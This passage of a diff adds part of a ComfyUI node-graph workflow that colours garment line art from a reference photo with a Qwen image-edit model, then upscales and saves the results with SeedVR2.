+    "inputs": {
+      "amount": [
+        "1229",
+        0
+      ],
+      "samples": [
+        "1164",
+        0
+      ]
+    },
+    "class_type": "RepeatLatentBatch",
+    "_meta": {
+      "title": "复制Latent批次"
+    }
+  },
+  "1163": {
+    "inputs": {
+      "conditioning": [
+        "1168",
+        0
+      ],
+      "latent": [
+        "1164",
+        0
+      ]
+    },
+    "class_type": "ReferenceLatent",
+    "_meta": {
+      "title": "ReferenceLatent"
+    }
+  },
+  "1164": {
+    "inputs": {
+      "pixels": [
+        "1234",
+        0
+      ],
+      "vae": [
+        "782",
+        0
+      ]
+    },
+    "class_type": "VAEEncode",
+    "_meta": {
+      "title": "VAE编码"
+    }
+  },
+  "1165": {
+    "inputs": {
+      "pixels": [
+        "1157",
+        1
+      ],
+      "vae": [
+        "782",
+        0
+      ]
+    },
+    "class_type": "VAEEncode",
+    "_meta": {
+      "title": "VAE编码"
+    }
+  },
+  "1166": {
+    "inputs": {
+      "conditioning": [
+        "1163",
+        0
+      ],
+      "latent": [
+        "1165",
+        0
+      ]
+    },
+    "class_type": "ReferenceLatent",
+    "_meta": {
+      "title": "ReferenceLatent"
+    }
+  },
+  "1167": {
+    "inputs": {
+      "prompt": "",
+      "clip": [
+        "783",
+        0
+      ],
+      "vae": [
+        "782",
+        0
+      ],
+      "image1": [
+        "1234",
+        0
+      ],
+      "image2": [
+        "1157",
+        1
+      ]
+    },
+    "class_type": "TextEncodeQwenImageEditPlus",
+    "_meta": {
+      "title": "TextEncodeQwenImageEditPlus"
+    }
+  },
+  "1168": {
+    "inputs": {
+      "prompt": "Fill the line art with colors taken directly from the reference garment photo. Keep the original line art structure intact, no shape distortion. Flat lighting, solid colors, no shadows, no wrinkles, clean print-ready output.",
+      "clip": [
+        "783",
+        0
+      ],
+      "image1": [
+        "1234",
+        0
+      ],
+      "image2": [
+        "1157",
+        1
+      ]
+    },
+    "class_type": "TextEncodeQwenImageEditPlus",
+    "_meta": {
+      "title": "TextEncodeQwenImageEditPlus"
+    }
+  },
+  "1170": {
+    "inputs": {
+      "image": "5x10.png"
+    },
+    "class_type": "LoadImage",
+    "_meta": {
+      "title": "尺码"
+    }
+  },
+  "1171": {
+    "inputs": {
+      "input_text": [
+        "1176",
+        0
+      ],
+      "substring": "",
+      "mode": "任意满足"
+    },
+    "class_type": "CheckSubstringPresence",
+    "_meta": {
+      "title": "判断是否包含字符🐠meeeyo.com"
+    }
+  },
+  "1172": {
+    "inputs": {
+      "boolean": true,
+      "on_true": [
+        "1173",
+        0
+      ],
+      "on_false": [
+        "1171",
+        0
+      ]
+    },
+    "class_type": "easy ifElse",
+    "_meta": {
+      "title": "是否判断"
+    }
+  },
+  "1173": {
+    "inputs": {
+      "input_text": [
+        "1176",
+        0
+      ],
+      "substring": "5",
+      "mode": "同时满足"
+    },
+    "class_type": "CheckSubstringPresence",
+    "_meta": {
+      "title": "判断是否包含字符🐠meeeyo.com"
+    }
+  },
+  "1174": {
+    "inputs": {
+      "text": "0",
+      "anything": [
+        "1172",
+        0
+      ]
+    },
+    "class_type": "easy showAnything",
+    "_meta": {
+      "title": "展示任何"
+    }
+  },
+  "1175": {
+    "inputs": {
+      "image": [
+        "1170",
+        0
+      ]
+    },
+    "class_type": "GetImageSize+",
+    "_meta": {
+      "title": "🔧 Get Image Size"
+    }
+  },
+  "1176": {
+    "inputs": {
+      "text": "1340",
+      "anything": [
+        "1175",
+        0
+      ]
+    },
+    "class_type": "easy showAnything",
+    "_meta": {
+      "title": "展示任何"
+    }
+  },
+  "1177": {
+    "inputs": {
+      "condition": [
+        "1174",
+        0
+      ],
+      "image": [
+        "1245",
+        1
+      ]
+    },
+    "class_type": "kangmeng",
+    "_meta": {
+      "title": "kangmeng (条件路由)"
+    }
+  },
+  "1179": {
+    "inputs": {
+      "samples": [
+        "1180",
+        0
+      ],
+      "vae": [
+        "782",
+        0
+      ]
+    },
+    "class_type": "VAEDecode",
+    "_meta": {
+      "title": "VAE解码"
+    }
+  },
+  "1180": {
+    "inputs": {
+      "seed": 814283498084395,
+      "steps": 4,
+      "cfg": 1.0,
+      "sampler_name": "euler",
+      "scheduler": "simple",
+      "denoise": 1.0,
+      "model": [
+        "784",
+        0
+      ],
+      "positive": [
+        "1186",
+        0
+      ],
+      "negative": [
+        "1187",
+        0
+      ],
+      "latent_image": [
+        "1182",
+        0
+      ]
+    },
+    "class_type": "KSampler",
+    "_meta": {
+      "title": "K采样器"
+    }
+  },
+  "1182": {
+    "inputs": {
+      "amount": [
+        "1229",
+        0
+      ],
+      "samples": [
+        "1184",
+        0
+      ]
+    },
+    "class_type": "RepeatLatentBatch",
+    "_meta": {
+      "title": "复制Latent批次"
+    }
+  },
+  "1183": {
+    "inputs": {
+      "conditioning": [
+        "1188",
+        0
+      ],
+      "latent": [
+        "1184",
+        0
+      ]
+    },
+    "class_type": "ReferenceLatent",
+    "_meta": {
+      "title": "ReferenceLatent"
+    }
+  },
+  "1184": {
+    "inputs": {
+      "pixels": [
+        "1234",
+        0
+      ],
+      "vae": [
+        "782",
+        0
+      ]
+    },
+    "class_type": "VAEEncode",
+    "_meta": {
+      "title": "VAE编码"
+    }
+  },
+  "1185": {
+    "inputs": {
+      "pixels": [
+        "1177",
+        1
+      ],
+      "vae": [
+        "782",
+        0
+      ]
+    },
+    "class_type": "VAEEncode",
+    "_meta": {
+      "title": "VAE编码"
+    }
+  },
+  "1186": {
+    "inputs": {
+      "conditioning": [
+        "1183",
+        0
+      ],
+      "latent": [
+        "1185",
+        0
+      ]
+    },
+    "class_type": "ReferenceLatent",
+    "_meta": {
+      "title": "ReferenceLatent"
+    }
+  },
+  "1187": {
+    "inputs": {
+      "prompt": "",
+      "clip": [
+        "783",
+        0
+      ],
+      "vae": [
+        "782",
+        0
+      ],
+      "image1": [
+        "1234",
+        0
+      ],
+      "image2": [
+        "1177",
+        1
+      ]
+    },
+    "class_type": "TextEncodeQwenImageEditPlus",
+    "_meta": {
+      "title": "TextEncodeQwenImageEditPlus"
+    }
+  },
+  "1188": {
+    "inputs": {
+      "prompt": "Fill the line art with colors taken directly from the reference garment photo. Keep the original line art structure intact, no shape distortion. Flat lighting, solid colors, no shadows, no wrinkles, clean print-ready output.",
+      "clip": [
+        "783",
+        0
+      ],
+      "image1": [
+        "1234",
+        0
+      ],
+      "image2": [
+        "1177",
+        1
+      ]
+    },
+    "class_type": "TextEncodeQwenImageEditPlus",
+    "_meta": {
+      "title": "TextEncodeQwenImageEditPlus"
+    }
+  },
+  "1190": {
+    "inputs": {
+      "image": "5x10.png"
+    },
+    "class_type": "LoadImage",
+    "_meta": {
+      "title": "尺码"
+    }
+  },
+  "1191": {
+    "inputs": {
+      "input_text": [
+        "1196",
+        0
+      ],
+      "substring": "",
+      "mode": "任意满足"
+    },
+    "class_type": "CheckSubstringPresence",
+    "_meta": {
+      "title": "判断是否包含字符🐠meeeyo.com"
+    }
+  },
+  "1192": {
+    "inputs": {
+      "boolean": true,
+      "on_true": [
+        "1193",
+        0
+      ],
+      "on_false": [
+        "1191",
+        0
+      ]
+    },
+    "class_type": "easy ifElse",
+    "_meta": {
+      "title": "是否判断"
+    }
+  },
+  "1193": {
+    "inputs": {
+      "input_text": [
+        "1196",
+        0
+      ],
+      "substring": "5",
+      "mode": "同时满足"
+    },
+    "class_type": "CheckSubstringPresence",
+    "_meta": {
+      "title": "判断是否包含字符🐠meeeyo.com"
+    }
+  },
+  "1194": {
+    "inputs": {
+      "text": "0",
+      "anything": [
+        "1192",
+        0
+      ]
+    },
+    "class_type": "easy showAnything",
+    "_meta": {
+      "title": "展示任何"
+    }
+  },
+  "1195": {
+    "inputs": {
+      "image": [
+        "1190",
+        0
+      ]
+    },
+    "class_type": "GetImageSize+",
+    "_meta": {
+      "title": "🔧 Get Image Size"
+    }
+  },
+  "1196": {
+    "inputs": {
+      "text": "476",
+      "anything": [
+        "1195",
+        0
+      ]
+    },
+    "class_type": "easy showAnything",
+    "_meta": {
+      "title": "展示任何"
+    }
+  },
+  "1197": {
+    "inputs": {
+      "condition": [
+        "1194",
+        0
+      ],
+      "image": [
+        "1246",
+        1
+      ]
+    },
+    "class_type": "kangmeng",
+    "_meta": {
+      "title": "kangmeng (条件路由)"
+    }
+  },
+  "1199": {
+    "inputs": {
+      "samples": [
+        "1200",
+        0
+      ],
+      "vae": [
+        "782",
+        0
+      ]
+    },
+    "class_type": "VAEDecode",
+    "_meta": {
+      "title": "VAE解码"
+    }
+  },
+  "1200": {
+    "inputs": {
+      "seed": 814283498084395,
+      "steps": 4,
+      "cfg": 1.0,
+      "sampler_name": "euler",
+      "scheduler": "simple",
+      "denoise": 1.0,
+      "model": [
+        "784",
+        0
+      ],
+      "positive": [
+        "1206",
+        0
+      ],
+      "negative": [
+        "1207",
+        0
+      ],
+      "latent_image": [
+        "1202",
+        0
+      ]
+    },
+    "class_type": "KSampler",
+    "_meta": {
+      "title": "K采样器"
+    }
+  },
+  "1202": {
+    "inputs": {
+      "amount": [
+        "1229",
+        0
+      ],
+      "samples": [
+        "1204",
+        0
+      ]
+    },
+    "class_type": "RepeatLatentBatch",
+    "_meta": {
+      "title": "复制Latent批次"
+    }
+  },
+  "1203": {
+    "inputs": {
+      "conditioning": [
+        "1208",
+        0
+      ],
+      "latent": [
+        "1204",
+        0
+      ]
+    },
+    "class_type": "ReferenceLatent",
+    "_meta": {
+      "title": "ReferenceLatent"
+    }
+  },
+  "1204": {
+    "inputs": {
+      "pixels": [
+        "1234",
+        0
+      ],
+      "vae": [
+        "782",
+        0
+      ]
+    },
+    "class_type": "VAEEncode",
+    "_meta": {
+      "title": "VAE编码"
+    }
+  },
+  "1205": {
+    "inputs": {
+      "pixels": [
+        "1197",
+        1
+      ],
+      "vae": [
+        "782",
+        0
+      ]
+    },
+    "class_type": "VAEEncode",
+    "_meta": {
+      "title": "VAE编码"
+    }
+  },
+  "1206": {
+    "inputs": {
+      "conditioning": [
+        "1203",
+        0
+      ],
+      "latent": [
+        "1205",
+        0
+      ]
+    },
+    "class_type": "ReferenceLatent",
+    "_meta": {
+      "title": "ReferenceLatent"
+    }
+  },
+  "1207": {
+    "inputs": {
+      "prompt": "",
+      "clip": [
+        "783",
+        0
+      ],
+      "vae": [
+        "782",
+        0
+      ],
+      "image1": [
+        "1234",
+        0
+      ],
+      "image2": [
+        "1197",
+        1
+      ]
+    },
+    "class_type": "TextEncodeQwenImageEditPlus",
+    "_meta": {
+      "title": "TextEncodeQwenImageEditPlus"
+    }
+  },
+  "1208": {
+    "inputs": {
+      "prompt": "Fill the line art with colors taken directly from the reference garment photo. Keep the original line art structure intact, no shape distortion. Flat lighting, solid colors, no shadows, no wrinkles, clean print-ready output.",
+      "clip": [
+        "783",
+        0
+      ],
+      "image1": [
+        "1234",
+        0
+      ],
+      "image2": [
+        "1197",
+        1
+      ]
+    },
+    "class_type": "TextEncodeQwenImageEditPlus",
+    "_meta": {
+      "title": "TextEncodeQwenImageEditPlus"
+    }
+  },
+  "1210": {
+    "inputs": {
+      "image": "5x10.png"
+    },
+    "class_type": "LoadImage",
+    "_meta": {
+      "title": "尺码"
+    }
+  },
+  "1211": {
+    "inputs": {
+      "input_text": [
+        "1216",
+        0
+      ],
+      "substring": "",
+      "mode": "任意满足"
+    },
+    "class_type": "CheckSubstringPresence",
+    "_meta": {
+      "title": "判断是否包含字符🐠meeeyo.com"
+    }
+  },
+  "1212": {
+    "inputs": {
+      "boolean": true,
+      "on_true": [
+        "1213",
+        0
+      ],
+      "on_false": [
+        "1211",
+        0
+      ]
+    },
+    "class_type": "easy ifElse",
+    "_meta": {
+      "title": "是否判断"
+    }
+  },
+  "1213": {
+    "inputs": {
+      "input_text": [
+        "1216",
+        0
+      ],
+      "substring": "5",
+      "mode": "同时满足"
+    },
+    "class_type": "CheckSubstringPresence",
+    "_meta": {
+      "title": "判断是否包含字符🐠meeeyo.com"
+    }
+  },
+  "1214": {
+    "inputs": {
+      "text": "0",
+      "anything": [
+        "1212",
+        0
+      ]
+    },
+    "class_type": "easy showAnything",
+    "_meta": {
+      "title": "展示任何"
+    }
+  },
+  "1215": {
+    "inputs": {
+      "image": [
+        "1210",
+        0
+      ]
+    },
+    "class_type": "GetImageSize+",
+    "_meta": {
+      "title": "🔧 Get Image Size"
+    }
+  },
+  "1216": {
+    "inputs": {
+      "text": "1340",
+      "anything": [
+        "1215",
+        0
+      ]
+    },
+    "class_type": "easy showAnything",
+    "_meta": {
+      "title": "展示任何"
+    }
+  },
+  "1217": {
+    "inputs": {
+      "condition": [
+        "1214",
+        0
+      ],
+      "image": [
+        "1247",
+        1
+      ]
+    },
+    "class_type": "kangmeng",
+    "_meta": {
+      "title": "kangmeng (条件路由)"
+    }
+  },
+  "1219": {
+    "inputs": {
+      "samples": [
+        "1220",
+        0
+      ],
+      "vae": [
+        "782",
+        0
+      ]
+    },
+    "class_type": "VAEDecode",
+    "_meta": {
+      "title": "VAE解码"
+    }
+  },
+  "1220": {
+    "inputs": {
+      "seed": 814283498084395,
+      "steps": 4,
+      "cfg": 1.0,
+      "sampler_name": "euler",
+      "scheduler": "simple",
+      "denoise": 1.0,
+      "model": [
+        "784",
+        0
+      ],
+      "positive": [
+        "1226",
+        0
+      ],
+      "negative": [
+        "1227",
+        0
+      ],
+      "latent_image": [
+        "1222",
+        0
+      ]
+    },
+    "class_type": "KSampler",
+    "_meta": {
+      "title": "K采样器"
+    }
+  },
+  "1222": {
+    "inputs": {
+      "amount": [
+        "1229",
+        0
+      ],
+      "samples": [
+        "1224",
+        0
+      ]
+    },
+    "class_type": "RepeatLatentBatch",
+    "_meta": {
+      "title": "复制Latent批次"
+    }
+  },
+  "1223": {
+    "inputs": {
+      "conditioning": [
+        "1228",
+        0
+      ],
+      "latent": [
+        "1224",
+        0
+      ]
+    },
+    "class_type": "ReferenceLatent",
+    "_meta": {
+      "title": "ReferenceLatent"
+    }
+  },
+  "1224": {
+    "inputs": {
+      "pixels": [
+        "1234",
+        0
+      ],
+      "vae": [
+        "782",
+        0
+      ]
+    },
+    "class_type": "VAEEncode",
+    "_meta": {
+      "title": "VAE编码"
+    }
+  },
+  "1225": {
+    "inputs": {
+      "pixels": [
+        "1217",
+        1
+      ],
+      "vae": [
+        "782",
+        0
+      ]
+    },
+    "class_type": "VAEEncode",
+    "_meta": {
+      "title": "VAE编码"
+    }
+  },
+  "1226": {
+    "inputs": {
+      "conditioning": [
+        "1223",
+        0
+      ],
+      "latent": [
+        "1225",
+        0
+      ]
+    },
+    "class_type": "ReferenceLatent",
+    "_meta": {
+      "title": "ReferenceLatent"
+    }
+  },
+  "1227": {
+    "inputs": {
+      "prompt": "",
+      "clip": [
+        "783",
+        0
+      ],
+      "vae": [
+        "782",
+        0
+      ],
+      "image1": [
+        "1234",
+        0
+      ],
+      "image2": [
+        "1217",
+        1
+      ]
+    },
+    "class_type": "TextEncodeQwenImageEditPlus",
+    "_meta": {
+      "title": "TextEncodeQwenImageEditPlus"
+    }
+  },
+  "1228": {
+    "inputs": {
+      "prompt": "Fill the line art with colors taken directly from the reference garment photo. Keep the original line art structure intact, no shape distortion. Flat lighting, solid colors, no shadows, no wrinkles, clean print-ready output.",
+      "clip": [
+        "783",
+        0
+      ],
+      "image1": [
+        "1234",
+        0
+      ],
+      "image2": [
+        "1217",
+        1
+      ]
+    },
+    "class_type": "TextEncodeQwenImageEditPlus",
+    "_meta": {
+      "title": "TextEncodeQwenImageEditPlus"
+    }
+  },
+  "1229": {
+    "inputs": {
+      "Number": "4"
+    },
+    "class_type": "Int",
+    "_meta": {
+      "title": "几张图"
+    }
+  },
+  "1234": {
+    "inputs": {
+      "image": "ad472e278e004557a305f0119eb7547a_.jpg"
+    },
+    "class_type": "LoadImage",
+    "_meta": {
+      "title": "参考图"
+    }
+  },
+  "1242": {
+    "inputs": {
+      "signal": [
+        "1253",
+        0
+      ],
+      "value": [
+        "706",
+        0
+      ]
+    },
+    "class_type": "ImpactExecutionOrderController",
+    "_meta": {
+      "title": "Execution Order Controller"
+    }
+  },
+  "1243": {
+    "inputs": {
+      "signal": [
+        "1267",
+        0
+      ],
+      "value": [
+        "1070",
+        0
+      ]
+    },
+    "class_type": "ImpactExecutionOrderController",
+    "_meta": {
+      "title": "Execution Order Controller"
+    }
+  },
+  "1244": {
+    "inputs": {
+      "signal": [
+        "1271",
+        0
+      ],
+      "value": [
+        "1090",
+        0
+      ]
+    },
+    "class_type": "ImpactExecutionOrderController",
+    "_meta": {
+      "title": "Execution Order Controller"
+    }
+  },
+  "1245": {
+    "inputs": {
+      "signal": [
+        "1275",
+        0
+      ],
+      "value": [
+        "1170",
+        0
+      ]
+    },
+    "class_type": "ImpactExecutionOrderController",
+    "_meta": {
+      "title": "Execution Order Controller"
+    }
+  },
+  "1246": {
+    "inputs": {
+      "signal": [
+        "1279",
+        0
+      ],
+      "value": [
+        "1190",
+        0
+      ]
+    },
+    "class_type": "ImpactExecutionOrderController",
+    "_meta": {
+      "title": "Execution Order Controller"
+    }
+  },
+  "1247": {
+    "inputs": {
+      "signal": [
+        "1283",
+        0
+      ],
+      "value": [
+        "1210",
+        0
+      ]
+    },
+    "class_type": "ImpactExecutionOrderController",
+    "_meta": {
+      "title": "Execution Order Controller"
+    }
+  },
+  "1248": {
+    "inputs": {
+      "signal": [
+        "1287",
+        0
+      ],
+      "value": [
+        "1150",
+        0
+      ]
+    },
+    "class_type": "ImpactExecutionOrderController",
+    "_meta": {
+      "title": "Execution Order Controller"
+    }
+  },
+  "1249": {
+    "inputs": {
+      "signal": [
+        "1291",
+        0
+      ],
+      "value": [
+        "1130",
+        0
+      ]
+    },
+    "class_type": "ImpactExecutionOrderController",
+    "_meta": {
+      "title": "Execution Order Controller"
+    }
+  },
+  "1250": {
+    "inputs": {
+      "signal": [
+        "1295",
+        0
+      ],
+      "value": [
+        "1110",
+        0
+      ]
+    },
+    "class_type": "ImpactExecutionOrderController",
+    "_meta": {
+      "title": "Execution Order Controller"
+    }
+  },
+  "1251": {
+    "inputs": {
+      "model": "ema_vae_fp16.safetensors",
+      "device": "cuda:0",
+      "encode_tiled": true,
+      "encode_tile_size": 1024,
+      "encode_tile_overlap": 128,
+      "decode_tiled": true,
+      "decode_tile_size": 1024,
+      "decode_tile_overlap": 128,
+      "tile_debug": "false",
+      "offload_device": "cuda:0",
+      "cache_model": false
+    },
+    "class_type": "SeedVR2LoadVAEModel",
+    "_meta": {
+      "title": "SeedVR2 (Down)Load VAE Model"
+    }
+  },
+  "1252": {
+    "inputs": {
+      "model": "seedvr2_ema_3b_fp16.safetensors",
+      "device": "cuda:0",
+      "blocks_to_swap": 32,
+      "swap_io_components": false,
+      "offload_device": "cpu",
+      "cache_model": false,
+      "attention_mode": "sdpa"
+    },
+    "class_type": "SeedVR2LoadDiTModel",
+    "_meta": {
+      "title": "SeedVR2 (Down)Load DiT Model"
+    }
+  },
+  "1253": {
+    "inputs": {
+      "seed": 2961070799,
+      "resolution": 2048,
+      "max_resolution": 4500,
+      "batch_size": 1,
+      "uniform_batch_size": false,
+      "color_correction": "wavelet",
+      "temporal_overlap": 0,
+      "prepend_frames": 0,
+      "input_noise_scale": 0.0,
+      "latent_noise_scale": 0.0,
+      "offload_device": "cuda:0",
+      "enable_debug": false,
+      "image": [
+        "772",
+        0
+      ],
+      "dit": [
+        "1252",
+        0
+      ],
+      "vae": [
+        "1251",
+        0
+      ]
+    },
+    "class_type": "SeedVR2VideoUpscaler",
+    "_meta": {
+      "title": "SeedVR2 Video Upscaler (v2.5.24)"
+    }
+  },
+  "1254": {
+    "inputs": {
+      "filename_prefix": "ComfyUI",
+      "images": [
+        "1242",
+        0
+      ]
+    },
+    "class_type": "SaveImage",
+    "_meta": {
+      "title": "保存图像"
+    }
+  },
+  "1255": {
+    "inputs": {
+      "images": [
+        "760",
+        0
+      ]
+    },
+    "class_type": "PreviewImage",
+    "_meta": {
+      "title": "预览图像"
+    }
+  },
+  "1256": {
+    "inputs": {
+      "images": [
+        "1077",
+        0
+      ]
+    },
+    "class_type": "PreviewImage",
+    "_meta": {
+      "title": "预览图像"
+    }
+  },
+  "1257": {
+    "inputs": {
+      "images": [
+        "1097",
+        0
+      ]
+    },
+    "class_type": "PreviewImage",
+    "_meta": {
+      "title": "预览图像"
+    }
+  },
+  "1258": {
+    "inputs": {
+      "images": [
+        "1177",
+        0
+      ]
+    },
+    "class_type": "PreviewImage",
+    "_meta": {
+      "title": "预览图像"
+    }
+  },
+  "1259": {
+    "inputs": {
+      "images": [
+        "1197",
+        0
+      ]
+    },
+    "class_type": "PreviewImage",
+    "_meta": {
+      "title": "预览图像"
+    }
+  },
+  "1260": {
+    "inputs": {
+      "images": [
+        "1217",
+        0
+      ]
+    },
+    "class_type": "PreviewImage",
+    "_meta": {
+      "title": "预览图像"
+    }
+  },
+  "1261": {
+    "inputs": {
+      "images": [
+        "1157",
+        0
+      ]
+    },
+    "class_type": "PreviewImage",
+    "_meta": {
+      "title": "预览图像"
+    }
+  },
+  "1262": {
+    "inputs": {
+      "images": [
+        "1137",
+        0
+      ]
+    },
+    "class_type": "PreviewImage",
+    "_meta": {
+      "title": "预览图像"
+    }
+  },
+  "1263": {
+    "inputs": {
+      "images": [
+        "1117",
+        0
+      ]
+    },
+    "class_type": "PreviewImage",
+    "_meta": {
+      "title": "预览图像"
+    }
+  },
+  "1264": {
+    "inputs": {
+      "model": "ema_vae_fp16.safetensors",
+      "device": "cuda:0",
+      "encode_tiled": true,
+      "encode_tile_size": 1024,
+      "encode_tile_overlap": 128,
+      "decode_tiled": true,
+      "decode_tile_size": 1024,
+      "decode_tile_overlap": 128,
+      "tile_debug": "false",
+      "offload_device": "cuda:0",
+      "cache_model": false
+    },
+    "class_type": "SeedVR2LoadVAEModel",
+    "_meta": {
+      "title": "SeedVR2 (Down)Load VAE Model"
+    }
+  },
+  "1265": {
+    "inputs": {
+      "filename_prefix": "ComfyUI",
+      "images": [
+        "1267",
+        0
+      ]
+    },
+    "class_type": "SaveImage",
+    "_meta": {
+      "title": "保存图像"
+    }
+  },
+  "1266": {
+    "inputs": {
+      "model": "seedvr2_ema_3b_fp16.safetensors",
+      "device": "cuda:0",
+      "blocks_to_swap": 32,
+      "swap_io_components": false,
+      "offload_device": "cpu",
+      "cache_model": false,
+      "attention_mode": "sdpa"
+    },
+    "class_type": "SeedVR2LoadDiTModel",
+    "_meta": {
+      "title": "SeedVR2 (Down)Load DiT Model"
+    }
+  },
+  "1267": {
+    "inputs": {
+      "seed": 2961070799,
+      "resolution": 2048,
+      "max_resolution": 4500,
+      "batch_size": 1,
+      "uniform_batch_size": false,
+      "color_correction": "wavelet",
+      "temporal_overlap": 0,
+      "prepend_frames": 0,
+      "input_noise_scale": 0.0,
+      "latent_noise_scale": 0.0,
+      "offload_device": "cuda:0",
+      "enable_debug": false,
+      "image": [
+        "762",
+        0
+      ],
+      "dit": [
+        "1266",
+        0
+      ],
+      "vae": [
+        "1264",
+        0
+      ]
+    },
+    "class_type": "SeedVR2VideoUpscaler",
+    "_meta": {
+      "title": "SeedVR2 Video Upscaler (v2.5.24)"
+    }
+  },
+  "1268": {
+    "inputs": {
+      "model": "ema_vae_fp16.safetensors",
+      "device": "cuda:0",
+      "encode_tiled": true,
+      "encode_tile_size": 1024,
+      "encode_tile_overlap": 128,
+      "decode_tiled": true,
+      "decode_tile_size": 1024,
+      "decode_tile_overlap": 128,
+      "tile_debug": "false",
+      "offload_device": "cuda:0",
+      "cache_model": false
+    },
+    "class_type": "SeedVR2LoadVAEModel",
+    "_meta": {
+      "title": "SeedVR2 (Down)Load VAE Model"
+    }
+  },
+  "1269": {
+    "inputs": {
+      "model": "seedvr2_ema_3b_fp16.safetensors",
+      "device": "cuda:0",
+      "blocks_to_swap": 32,
+      "swap_io_components": false,
+      "offload_device": "cpu",
+      "cache_model": false,
+      "attention_mode": "sdpa"
+    },
+    "class_type": "SeedVR2LoadDiTModel",
+    "_meta": {
+      "title": "SeedVR2 (Down)Load DiT Model"
+    }
+  },
+  "1270": {
+    "inputs": {
+      "filename_prefix": "ComfyUI",
+      "images": [
+        "1271",
+        0
+      ]
+    },
+    "class_type": "SaveImage",
+    "_meta": {
+      "title": "保存图像"
+    }
+  },
+  "1271": {
+    "inputs": {
+      "seed": 2961070799,
+      "resolution": 2048,
+      "max_resolution": 4500,
+      "batch_size": 1,
+      "uniform_batch_size": false,
+      "color_correction": "wavelet",
+      "temporal_overlap": 0,
+      "prepend_frames": 0,
+      "input_noise_scale": 0.0,
+      "latent_noise_scale": 0.0,
+      "offload_device": "cuda:0",
+      "enable_debug": false,
+      "image": [
+        "1079",
+        0
+      ],
+      "dit": [
+        "1269",
+        0
+      ],
+      "vae": [
+        "1268",
+        0
+      ]
+    },
+    "class_type": "SeedVR2VideoUpscaler",
+    "_meta": {
+      "title": "SeedVR2 Video Upscaler (v2.5.24)"
+    }
+  },
+  "1272": {
+    "inputs": {
+      "model": "ema_vae_fp16.safetensors",
+      "device": "cuda:0",
+      "encode_tiled": true,
+      "encode_tile_size": 1024,
+      "encode_tile_overlap": 128,
+      "decode_tiled": true,
+      "decode_tile_size": 1024,
+      "decode_tile_overlap": 128,
+      "tile_debug": "false",
+      "offload_device": "cuda:0",
+      "cache_model": false
+    },
+    "class_type": "SeedVR2LoadVAEModel",
+    "_meta": {
+      "title": "SeedVR2 (Down)Load VAE Model"
+    }
+  },
+  "1273": {
+    "inputs": {
+      "model": "seedvr2_ema_3b_fp16.safetensors",
+      "device": "cuda:0",
+      "blocks_to_swap": 32,
+      "swap_io_components": false,
+      "offload_device": "cpu",
+      "cache_model": false,
+      "attention_mode": "sdpa"
+    },
+    "class_type": "SeedVR2LoadDiTModel",
+    "_meta": {
+      "title": "SeedVR2 (Down)Load DiT Model"
+    }
+  },
+  "1274": {
+    "inputs": {
+      "filename_prefix": "ComfyUI",
+      "images": [
+        "1275",
+        0
+      ]
+    },
+    "class_type": "SaveImage",
+    "_meta": {
+      "title": "保存图像"
+    }
+  },
+  "1275": {
+    "inputs": {
+      "seed": 2961070799,
+      "resolution": 2048,
+      "max_resolution": 4500,
+      "batch_size": 1,
+      "uniform_batch_size": false,
+      "color_correction": "wavelet",
+      "temporal_overlap": 0,
+      "prepend_frames": 0,
+      "input_noise_scale": 0.0,
+      "latent_noise_scale": 0.0,
+      "offload_device": "cuda:0",
+      "enable_debug": false,
+      "image": [
+        "1099",
+        0
+      ],
+      "dit": [
+        "1273",
+        0
+      ],
+      "vae": [
+        "1272",
+        0
+      ]
+    },
+    "class_type": "SeedVR2VideoUpscaler",
+    "_meta": {
+      "title": "SeedVR2 Video Upscaler (v2.5.24)"
+    }
+  },
+  "1276": {
+    "inputs": {
+      "model": "ema_vae_fp16.safetensors",
+      "device": "cuda:0",
+      "encode_tiled": true,
+      "encode_tile_size": 1024,
+      "encode_tile_overlap": 128,
+      "decode_tiled": true,
+      "decode_tile_size": 1024,
+      "decode_tile_overlap": 128,
+      "tile_debug": "false",
+      "offload_device": "cuda:0",
+      "cache_model": false
+    },
+    "class_type": "SeedVR2LoadVAEModel",
+    "_meta": {
+      "title": "SeedVR2 (Down)Load VAE Model"
+    }
+  },
+  "1277": {
+    "inputs": {
+      "model": "seedvr2_ema_3b_fp16.safetensors",
+      "device": "cuda:0",
+      "blocks_to_swap": 32,
+      "swap_io_components": false,
+      "offload_device": "cpu",
+      "cache_model": false,
+      "attention_mode": "sdpa"
+    },
+    "class_type": "SeedVR2LoadDiTModel",
+    "_meta": {
+      "title": "SeedVR2 (Down)Load DiT Model"
+    }
+  },
+  "1278": {
+    "inputs": {
+      "filename_prefix": "ComfyUI",
+      "images": [
+        "1279",
+        0
+      ]
+    },
+    "class_type": "SaveImage",
+    "_meta": {
+      "title": "保存图像"
+    }
+  },
+  "1279": {
+    "inputs": {
+      "seed": 2961070799,
+      "resolution": 2048,
+      "max_resolution": 4500,
+      "batch_size": 1,
+      "uniform_batch_size": false,
+      "color_correction": "wavelet",
+      "temporal_overlap": 0,
+      "prepend_frames": 0,
+      "input_noise_scale": 0.0,
+      "latent_noise_scale": 0.0,
+      "offload_device": "cuda:0",
+      "enable_debug": false,
+      "image": [
+        "1179",
+        0
+      ],
+      "dit": [
+        "1277",
+        0
+      ],
+      "vae": [
+        "1276",
+        0
+      ]
+    },
+    "class_type": "SeedVR2VideoUpscaler",
+    "_meta": {
+      "title": "SeedVR2 Video Upscaler (v2.5.24)"
+    }
+  },
+  "1280": {
+    "inputs": {
+      "model": "ema_vae_fp16.safetensors",
+      "device": "cuda:0",
+      "encode_tiled": true,
+      "encode_tile_size": 1024,
+      "encode_tile_overlap": 128,
+      "decode_tiled": true,
+      "decode_tile_size": 1024,
+      "decode_tile_overlap": 128,
+      "tile_debug": "false",
+      "offload_device": "cuda:0",
+      "cache_model": false
+    },
+    "class_type": "SeedVR2LoadVAEModel",
+    "_meta": {
+      "title": "SeedVR2 (Down)Load VAE Model"
+    }
+  },
+  "1281": {
+    "inputs": {
+      "model": "seedvr2_ema_3b_fp16.safetensors",
+      "device": "cuda:0",
+      "blocks_to_swap": 32,
+      "swap_io_components": false,
+      "offload_device": "cpu",
+      "cache_model": false,
+      "attention_mode": "sdpa"
+    },
+    "class_type": "SeedVR2LoadDiTModel",
+    "_meta": {
+      "title": "SeedVR2 (Down)Load DiT Model"
+    }
+  },
+  "1282": {
+    "inputs": {
+      "filename_prefix": "ComfyUI",
+      "images": [
+        "1283",
+        0
+      ]
+    },
+    "class_type": "SaveImage",
+    "_meta": {
+      "title": "保存图像"
+    }
+  },
+  "1283": {
+    "inputs": {
+      "seed": 2961070799,
+      "resolution": 2048,
+      "max_resolution": 4500,
+      "batch_size": 1,
+      "uniform_batch_size": false,
